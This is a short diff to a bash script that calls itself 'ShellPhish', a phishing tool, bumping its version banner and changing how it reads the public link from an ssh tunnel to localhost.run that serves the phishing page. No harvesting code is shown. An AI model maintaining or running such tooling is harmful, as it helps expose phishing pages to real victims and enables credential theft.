@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# ShellPhish v1.0 - MOD
+# ShellPhish v1.1 - MOD
 # Modded by @DHackerMe
 # Tested by @Kirito071008
 
@@ -73,7 +73,7 @@ printf "\e[1;92m     / /  | | DHackerMe | || |(_____ \ | |    (_)      | |     \
 printf "\e[1;91m     \ \  | |___   ____ | || | _____) )| |___  _   ___ | |___  \e[0m\n"
 printf "\e[1;91m      \ \ | |_  | / _  )| || ||  ____/ | |_  || | /___)| |_  | \e[0m\n"
 printf "\e[1;92m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
-printf "\e[1;92m (______/ |_| |_| \____)|_||_||_| v1.0 |_| |_||_|(___/ |_| |_| \e[0m\n"
+printf "\e[1;92m (______/ |_| |_| \____)|_||_||_| v1.1 |_| |_||_|(___/ |_| |_| \e[0m\n"
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @DHackerMe \e[0m\e[1;93m.:.:.\e[0m\n\n"
 printf "  \e[101m\e[1;77m::   Disclaimer: Developers assume no liability and are not   ::\e[0m\n"
@@ -399,7 +399,7 @@ rm -rf linksender
 fi
 ssh -R 80:localhost:$port nokey@localhost.run > lhr.txt 2>&1 &
 sleep 6
-lhrlink=$(tail -n 1 lhr.txt)
+lhrlink=$(cat lhr.txt)
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m $lhrlink\e[0m"
 printf "\n"
 if [[ -e lhr.txt ]]; then
